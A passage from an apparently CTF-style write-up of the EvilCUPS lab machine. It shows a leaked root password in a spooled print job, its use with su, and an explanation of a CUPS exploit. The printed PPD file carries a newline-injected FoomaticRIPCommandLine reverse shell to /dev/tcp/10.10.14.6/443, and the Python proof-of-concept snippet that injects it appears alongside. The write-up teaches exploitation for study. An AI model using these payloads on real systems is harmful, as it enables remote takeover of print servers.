+        rn lineheight mul neg /yp exch def
+        rn nlines idiv 2 mod 0 eq {
+          % Draw highlight bar.  4 is just a magic indentation.
+          xp 4 add yp cw 8 sub lineheight neg Box fill
+        } if
+      } for
+    } for
+
+  grestore
+} def
+
+% Line highlight bar.
+/line_highlight {       % x y width height gray -&gt; -
+  gsave
+    /gray exch def
+    Box gray setgray fill
+  grestore
+} def
+
+% Column separator lines.
+/column_lines {
+  gsave
+    .1 setlinewidth
+    0 d_footer_h translate
+    /cw d_output_w cols div def
+    1 1 cols 1 sub {
+      cw mul 0 moveto
+      0 d_output_h rlineto stroke
+    } for
+  grestore
+} def
+
+% Column borders.
+/column_borders {
+  gsave
+    .1 setlinewidth
+    0 d_footer_h moveto
+    0 d_output_h rlineto
+    d_output_w 0 rlineto
+    0 d_output_h neg rlineto
+    closepath stroke
+  grestore
+} def
+
+% Do the actual underlay drawing
+/draw_underlay {
+  ul_style 0 eq {
+    ul_str true charpath stroke
+  } {
+    ul_str show
+  } ifelse
+} def
+
+% Underlay
+/underlay {     % - -&gt; -
+  gsave
+    0 d_page_h translate
+    d_page_h neg d_page_w atan rotate
+
+    ul_gray setgray
+    ul_font setfont
+    /dw d_page_h dup mul d_page_w dup mul add sqrt def
+    ul_str stringwidth pop dw exch sub 2 div ul_h_ptsize -2 div moveto
+    draw_underlay
+  grestore
+} def
+
+/user_underlay {        % - -&gt; -
+  gsave
+    ul_x ul_y translate
+    ul_angle rotate
+    ul_gray setgray
+    ul_font setfont
+    0 0 ul_h_ptsize 2 div sub moveto
+    draw_underlay
+  grestore
+} def
+
+% Page prefeed
+/page_prefeed {         % bool -&gt; -
+  statusdict /prefeed known {
+    statusdict exch /prefeed exch put
+  } {
+    pop
+  } ifelse
+} def
+
+% Wrapped line markers
+/wrapped_line_mark {    % x y charwith charheight type -&gt; -
+  /type exch def
+  /h exch def
+  /w exch def
+  /y exch def
+  /x exch def
+
+  type 2 eq {
+    % Black boxes (like TeX does)
+    gsave
+      0 setlinewidth
+      x w 4 div add y M
+      0 h rlineto w 2 div 0 rlineto 0 h neg rlineto
+      closepath fill
+    grestore
+  } {
+    type 3 eq {
+      % Small arrows
+      gsave
+        .2 setlinewidth
+        x w 2 div add y h 2 div add M
+        w 4 div 0 rlineto
+        x w 4 div add y lineto stroke
+
+        x w 4 div add w 8 div add y h 4 div add M
+        x w 4 div add y lineto
+        w 4 div h 8 div rlineto stroke
+      grestore
+    } {
+      % do nothing
+    } ifelse
+  } ifelse
+} def
+
+% EPSF import.
+
+/BeginEPSF {
+  /b4_Inc_state save def                % Save state for cleanup
+  /dict_count countdictstack def        % Count objects on dict stack
+  /op_count count 1 sub def             % Count objects on operand stack
+  userdict begin
+  /showpage { } def
+  0 setgray 0 setlinecap
+  1 setlinewidth 0 setlinejoin
+  10 setmiterlimit [ ] 0 setdash newpath
+  /languagelevel where {
+    pop languagelevel
+    1 ne {
+      false setstrokeadjust false setoverprint
+    } if
+  } if
+} bind def
+
+/EndEPSF {
+  count op_count sub { pos } repeat     % Clean up stacks
+  countdictstack dict_count sub { end } repeat
+  b4_Inc_state restore
+} bind def
+
+% Check PostScript language level.
+/languagelevel where {
+  pop /gs_languagelevel languagelevel def
+} {
+  /gs_languagelevel 1 def
+} ifelse
+%%EndResource
+%%BeginResource: procset Enscript-Encoding-88591 1.6.5 90
+/encoding_vector [
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/space          /exclam         /quotedbl       /numbersign
+/dollar         /percent        /ampersand      /quoteright
+/parenleft      /parenright     /asterisk       /plus
+/comma          /hyphen         /period         /slash
+/zero           /one            /two            /three
+/four           /five           /six            /seven
+/eight          /nine           /colon          /semicolon
+/less           /equal          /greater        /question
+/at             /A              /B              /C
+/D              /E              /F              /G
+/H              /I              /J              /K
+/L              /M              /N              /O
+/P              /Q              /R              /S
+/T              /U              /V              /W
+/X              /Y              /Z              /bracketleft
+/backslash      /bracketright   /asciicircum    /underscore
+/quoteleft      /a              /b              /c
+/d              /e              /f              /g
+/h              /i              /j              /k
+/l              /m              /n              /o
+/p              /q              /r              /s
+/t              /u              /v              /w
+/x              /y              /z              /braceleft
+/bar            /braceright     /tilde          /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/.notdef        /.notdef        /.notdef        /.notdef
+/space          /exclamdown     /cent           /sterling
+/currency       /yen            /brokenbar      /section
+/dieresis       /copyright      /ordfeminine    /guillemotleft
+/logicalnot     /hyphen         /registered     /macron
+/degree         /plusminus      /twosuperior    /threesuperior
+/acute          /mu             /paragraph      /bullet
+/cedilla        /onesuperior    /ordmasculine   /guillemotright
+/onequarter     /onehalf        /threequarters  /questiondown
+/Agrave         /Aacute         /Acircumflex    /Atilde
+/Adieresis      /Aring          /AE             /Ccedilla
+/Egrave         /Eacute         /Ecircumflex    /Edieresis
+/Igrave         /Iacute         /Icircumflex    /Idieresis
+/Eth            /Ntilde         /Ograve         /Oacute
+/Ocircumflex    /Otilde         /Odieresis      /multiply
+/Oslash         /Ugrave         /Uacute         /Ucircumflex
+/Udieresis      /Yacute         /Thorn          /germandbls
+/agrave         /aacute         /acircumflex    /atilde
+/adieresis      /aring          /ae             /ccedilla
+/egrave         /eacute         /ecircumflex    /edieresis
+/igrave         /iacute         /icircumflex    /idieresis
+/eth            /ntilde         /ograve         /oacute
+/ocircumflex    /otilde         /odieresis      /divide
+/oslash         /ugrave         /uacute         /ucircumflex
+/udieresis      /yacute         /thorn          /ydieresis
+] def
+%%EndResource
+%%EndProlog
+%%BeginSetup
+%%IncludeResource: font Courier-Bold
+%%IncludeResource: font Courier
+/HFpt_w 10 def
+/HFpt_h 10 def
+/Courier-Bold /HF-gs-font MF
+/HF /HF-gs-font findfont [HFpt_w 0 0 HFpt_h 0 0] makefont def
+/Courier /F-gs-font MF
+/F-gs-font 10 10 SF
+/#copies 1 def
+% Pagedevice definitions:
+gs_languagelevel 1 gt {
+  &lt;&lt;
+    /PageSize [595 842]
+  &gt;&gt; setpagedevice
+} if
+%%BeginResource: procset Enscript-Header-simple 1.6.5 90
+
+/do_header {    % print default simple header
+  gsave
+    d_header_x d_header_y HFpt_h 3 div add translate
+
+    HF setfont
+    user_header_p {
+      5 0 moveto user_header_left_str show
+
+      d_header_w user_header_center_str stringwidth pop sub 2 div
+      0 moveto user_header_center_str show
+
+      d_header_w user_header_right_str stringwidth pop sub 5 sub
+      0 moveto user_header_right_str show
+    } {
+      5 0 moveto fname show
+      45 0 rmoveto fmodstr show
+      45 0 rmoveto pagenumstr show
+    } ifelse
+
+  grestore
+} def
+%%EndResource
+/d_page_w 559 def
+/d_page_h 770 def
+/d_header_x 0 def
+/d_header_y 755 def
+/d_header_w 559 def
+/d_header_h 15 def
+/d_footer_x 0 def
+/d_footer_y 0 def
+/d_footer_w 559 def
+/d_footer_h 0 def
+/d_output_w 559 def
+/d_output_h 755 def
+/cols 1 def
+%%EndSetup
+%%Page: (1) 1
+%%BeginPageSetup
+_S
+18 36 translate
+/pagenum 1 def
+/fname (pass.txt) def
+/fdir (.) def
+/ftail (pass.txt) def
+% User defined strings:
+/fmodstr (Sat Sep 28 09:30:10 2024) def
+/pagenumstr (1) def
+/user_header_p false def
+/user_footer_p false def
+%%EndPageSetup
+do_header
+5 742 M
+(Br3@k-G!@ss-r00t-evilcups) s
+_R
+S
+%%Trailer
+%%Pages: 1
+%%DocumentNeededResources: font Courier-Bold Courier
+%%EOF
+</span></code></pre></div></div>
+<h3 id="create-pdf">Create PDF</h3>
+<p>The password is visible in plaintext in the file, but it’s more fun to create a visible image of what was printed. I’ll take that file and save a copy on my host. I’ll use <code class="language-plaintext highlighter-rouge">ps2pdf</code> to generate a PDF:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ps2pdf d00001-001 d00001-001.pdf
+</code></pre></div></div>
+<p>And then open the resulting PDF:</p>
+<picture>
+<source srcset="/img/image-20240930132845472.webp" type="image/webp"/>
+<img alt="image-20240930132845472" class="include_image" loading="lazy" src="/img/image-20240930132845472.png"/>
+</picture>
+<p>It’s a <code class="language-plaintext highlighter-rouge">pass.txt</code> file, with a password!</p>
+<h3 id="su">su</h3>
+<p>That password works with <code class="language-plaintext highlighter-rouge">su</code> to get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@evilcups:/var/spool/cups$</span><span class="w"> </span>su -
+<span class="go">Password: 
+</span><span class="gp">root@evilcups:~#</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@evilcups:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">0cd5ff62************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<p>When I create a printer over <code class="language-plaintext highlighter-rouge">cups-browsed</code> like this, it reached out over IPP to the given URL. The resulting attributes are saved as a <code class="language-plaintext highlighter-rouge">.ppd</code> file, which is located in <code class="language-plaintext highlighter-rouge">/etc/cups/ppd</code> named after the printer name:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="400"><div class="highlight"><pre class="highlight"><code><span class="gp">root@evilcups:/etc/cups/ppd#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">HACKED_10_10_14_6.ppd
+</span><span class="gp">root@evilcups:/etc/cups/ppd#</span><span class="w"> </span><span class="nb">cat </span>HACKED_10_10_14_6.ppd
+<span class="go">*PPD-Adobe: "4.3"
+*APRemoteQueueID: ""
+*FormatVersion: "4.3"
+*FileVersion: "1.28.17"
+*LanguageVersion: English
+*LanguageEncoding: ISOLatin1
+*PSVersion: "(3010.000) 0"
+*LanguageLevel: "3"
+*FileSystem: False
+*PCFileName: "drvless.ppd"
+*Manufacturer: "HP"
+*ModelName: "HP 0.00"
+*Product: "(HP 0.00)"
+*NickName: "HP 0.00, driverless, cups-filters 1.28.17"
+*ShortNickName: "HP 0.00"
+*DefaultOutputOrder: Normal
+*ColorDevice: True
+*cupsVersion: 2.4
+*cupsSNMPSupplies: False
+*cupsLanguages: "en"
+*APSupplies: ""
+*FoomaticRIPCommandLine: "bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1""
+*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
+*cupsFilter2: "application/vnd.cups-pdf application/pdf 200 -"
+*% Printer did not supply page size info via IPP, using defaults
+*OpenUI *PageSize/Media Size: PickOne
+*OrderDependency: 10 AnySetup *PageSize
+*DefaultPageSize: Letter
+*PageSize Letter/US Letter: "&lt;&lt;/PageSize[612 792]&gt;&gt;setpagedevice"
+*PageSize Legal/US Legal: "&lt;&lt;/PageSize[612 1008]&gt;&gt;setpagedevice"
+*PageSize Executive/Executive: "&lt;&lt;/PageSize[522 756]&gt;&gt;setpagedevice"
+*PageSize Tabloid/Tabloid: "&lt;&lt;/PageSize[792 1224]&gt;&gt;setpagedevice"
+*PageSize A3/A3: "&lt;&lt;/PageSize[842 1191]&gt;&gt;setpagedevice"
+*PageSize A4/A4: "&lt;&lt;/PageSize[595 842]&gt;&gt;setpagedevice"
+*PageSize A5/A5: "&lt;&lt;/PageSize[420 595]&gt;&gt;setpagedevice"
+*PageSize B5/JIS B5: "&lt;&lt;/PageSize[516 729]&gt;&gt;setpagedevice"
+*PageSize EnvISOB5/Envelope B5: "&lt;&lt;/PageSize[499 709]&gt;&gt;setpagedevice"
+</span><span class="gp">*PageSize Env10/Envelope #</span>10 : <span class="s2">"&lt;&lt;/PageSize[297 684]&gt;&gt;setpagedevice"</span>
+<span class="go">*PageSize EnvC5/Envelope C5: "&lt;&lt;/PageSize[459 649]&gt;&gt;setpagedevice"
+*PageSize EnvDL/Envelope DL: "&lt;&lt;/PageSize[312 624]&gt;&gt;setpagedevice"
+*PageSize EnvMonarch/Envelope Monarch: "&lt;&lt;/PageSize[279 540]&gt;&gt;setpagedevice"
+*CloseUI: *PageSize
+*OpenUI *PageRegion/Media Size: PickOne
+*OrderDependency: 10 AnySetup *PageRegion
+*DefaultPageRegion: Letter
+*PageRegion Letter/US Letter: "&lt;&lt;/PageSize[612 792]&gt;&gt;setpagedevice"
+*PageRegion Legal/US Legal: "&lt;&lt;/PageSize[612 1008]&gt;&gt;setpagedevice"
+*PageRegion Executive/Executive: "&lt;&lt;/PageSize[522 756]&gt;&gt;setpagedevice"
+*PageRegion Tabloid/Tabloid: "&lt;&lt;/PageSize[792 1224]&gt;&gt;setpagedevice"
+*PageRegion A3/A3: "&lt;&lt;/PageSize[842 1191]&gt;&gt;setpagedevice"
+*PageRegion A4/A4: "&lt;&lt;/PageSize[595 842]&gt;&gt;setpagedevice"
+*PageRegion A5/A5: "&lt;&lt;/PageSize[420 595]&gt;&gt;setpagedevice"
+*PageRegion B5/JIS B5: "&lt;&lt;/PageSize[516 729]&gt;&gt;setpagedevice"
+*PageRegion EnvISOB5/Envelope B5: "&lt;&lt;/PageSize[499 709]&gt;&gt;setpagedevice"
+</span><span class="gp">*PageRegion Env10/Envelope #</span>10 : <span class="s2">"&lt;&lt;/PageSize[297 684]&gt;&gt;setpagedevice"</span>
+<span class="go">*PageRegion EnvC5/Envelope C5: "&lt;&lt;/PageSize[459 649]&gt;&gt;setpagedevice"
+*PageRegion EnvDL/Envelope DL: "&lt;&lt;/PageSize[312 624]&gt;&gt;setpagedevice"
+*PageRegion EnvMonarch/Envelope Monarch: "&lt;&lt;/PageSize[279 540]&gt;&gt;setpagedevice"
+*CloseUI: *PageSize
+*DefaultImageableArea: Letter
+*ImageableArea Letter/US Letter: "18 12 594 780"
+*ImageableArea Legal/US Legal: "18 12 594 996"
+*ImageableArea Executive/Executive: "18 12 504 744"
+*ImageableArea Tabloid/Tabloid: "18 12 774 1212"
+*ImageableArea A3/A3: "18 12 824 1179"
+*ImageableArea A4/A4: "18 12 577 830"
+*ImageableArea A5/A5: "18 12 402 583"
+*ImageableArea B5/JIS B5: "18 12 498 717"
+*ImageableArea EnvISOB5/Envelope B5: "18 12 481 697"
+</span><span class="gp">*ImageableArea Env10/Envelope #</span>10 : <span class="s2">"18 12 279 672"</span>
+<span class="go">*ImageableArea EnvC5/Envelope C5: "18 12 441 637"
+*ImageableArea EnvDL/Envelope DL: "18 12 294 612"
+*ImageableArea EnvMonarch/Envelope Monarch: "18 12 261 528"
+*DefaultPaperDimension: Letter
+*PaperDimension Letter/US Letter: "612 792"
+*PaperDimension Legal/US Legal: "612 1008"
+*PaperDimension Executive/Executive: "522 756"
+*PaperDimension Tabloid/Tabloid: "792 1224"
+*PaperDimension A3/A3: "842 1191"
+*PaperDimension A4/A4: "595 842"
+*PaperDimension A5/A5: "420 595"
+*PaperDimension B5/JIS B5: "516 729"
+*PaperDimension EnvISOB5/Envelope B5: "499 709"
+</span><span class="gp">*PaperDimension Env10/Envelope #</span>10 : <span class="s2">"297 684"</span>
+<span class="go">*PaperDimension EnvC5/Envelope C5: "459 649"
+*PaperDimension EnvDL/Envelope DL: "312 624"
+*PaperDimension EnvMonarch/Envelope Monarch: "279 540"
+*OpenUI *ColorModel/Print Color Mode: PickOne
+*OrderDependency: 10 AnySetup *ColorModel
+*DefaultColorModel: Gray
+*ColorModel FastGray/Fast Grayscale: "&lt;&lt;/cupsColorSpace 3/cupsBitsPerColor 1/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray&gt;&gt;setpagedevice"
+*ColorModel Gray/Grayscale: "&lt;&lt;/cupsColorSpace 18/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray&gt;&gt;setpagedevice"
+*ColorModel RGB/Color: "&lt;&lt;/cupsColorSpace 19/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceRGB&gt;&gt;setpagedevice"
+*CloseUI: *ColorModel
+*OpenUI *Duplex/2-Sided Printing: PickOne
+*OrderDependency: 10 AnySetup *Duplex
+*DefaultDuplex: None
+*Duplex None/Off: "&lt;&lt;/Duplex false&gt;&gt;setpagedevice"
+*Duplex DuplexNoTumble/On (Portrait): "&lt;&lt;/Duplex true/Tumble false&gt;&gt;setpagedevice"
+*Duplex DuplexTumble/On (Landscape): "&lt;&lt;/Duplex true/Tumble true&gt;&gt;setpagedevice"
+*CloseUI: *Duplex
+*DefaultResolution: 300dpi
+*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 -"
+</span></code></pre></div></div>
+<p>The important line is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*FoomaticRIPCommandLine: "bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1""
+</code></pre></div></div>
+<p>When it prints, it will run my reverse shell.</p>
+<p>Just above it, there’s an empty parameter:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*APSupplies: ""
+*FoomaticRIPCommandLine: "bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1""
+</code></pre></div></div>
+<p>That’s likely from the newline injection I mentioned <a href="#poc-analysis">above</a>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span>
+                <span class="sa">b</span><span class="sh">'</span><span class="s">printer-more-info</span><span class="sh">'</span><span class="p">,</span>
+                <span class="n">TagEnum</span><span class="p">.</span><span class="n">uri</span>
+            <span class="p">):</span> <span class="p">[</span><span class="sa">f</span><span class="sh">'"</span><span class="se">\n</span><span class="s">*FoomaticRIPCommandLine: </span><span class="sh">"</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">command</span><span class="si">}</span><span class="sh">"</span><span class="se">\n</span><span class="s">*cupsFilter2 : </span><span class="sh">"</span><span class="s">application/pdf application/vnd.cups-postscript 0 foomatic-rip</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()],</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">printer-more-info</code> must translate into the <code class="language-plaintext highlighter-rouge">APSupplies</code> attribute in the <code class="language-plaintext highlighter-rouge">.ppd</code> file, and then the new line starts the <code class="language-plaintext highlighter-rouge">FoomaticRIPCommandLine</code>.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2024/10/02/htb-evilcups.html"></a>
+</article>
